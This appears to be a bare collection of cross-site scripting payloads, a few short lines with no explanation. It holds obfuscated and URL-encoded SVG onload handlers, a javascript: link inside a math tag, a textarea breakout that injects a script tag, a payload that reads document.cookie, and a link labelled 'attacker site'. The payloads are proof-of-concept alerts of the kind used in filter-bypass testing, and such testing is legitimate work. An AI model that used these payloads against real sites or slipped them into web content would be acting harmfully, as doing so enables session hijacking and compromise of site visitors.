...
1%22%3C! — 3E%3CSvg%20OnLoad=_=confirm,_(document.domain)%3C! —


<a href="https://iq-rasco.github.io/xss//">attacker site!</a>
...
<Svg%20OnLoad%3D(alert)(1)>

image%20id=xss%20onfoc%3C!%3Eusin+alert(0)%0c
...
"><svg onload=alert(1)>
<math>
<xss href="javascript:alert(1)">Click me</xss>
</math>
...
!>\x3csVg/<sVg/oNloAd=alert(document.cookie)//>\x3e
...
</textarea><ScRiPt>prompt(/HI OXFORD/)</ScRiPt//
